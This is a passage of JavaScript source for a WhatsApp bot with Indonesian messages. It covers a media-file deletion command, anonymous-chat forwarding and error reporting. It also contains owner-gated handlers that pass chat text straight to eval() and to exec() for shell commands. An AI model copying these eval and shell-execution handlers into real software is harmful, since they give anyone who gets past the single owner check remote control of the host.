	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") || item.endsWith("opus") || item.endsWith("jpeg"))
	console.log(filteredArray.length); 
	let teks =`Terdeteksi ${filteredArray.length} file Kenangan <3\n\n`
	if(filteredArray.length == 0) return reply(`${teks}`)
	filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
	 
	reply(`${teks}`)
	
//	await sleep(2000)
	reply("Menghapus file Kenangan...")
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	//await sleep(2000)
	reply("Berhasil menghapus semua Kenangan <3")
	 
	});
	  }
	break 


















    




















case '>':
if (!DanzTheCreator) return reply(mess.only.owner)
var err = new TypeError
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replynano(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replynano(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replynano(util.format(_syntax + _err))
}
break











default:

if (budy.startsWith('<')) {
if (!DanzTheCreator) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('$')) {
                    if (!DanzTheCreator) return reply(mess.only.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replynano(err)
                        if (stdout) return replynano(stdout)
                    })
                }


if (budy.startsWith('vv')) {
if (!DanzTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!DanzTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
NanoBotz.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
NanoBotz.sendMessage(`${owner}@s.whatsapp.net`, { text: "Halo pengembang, sepertinya ada kesalahan, mohon diperbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})

//baru sampai getcase di line 14015



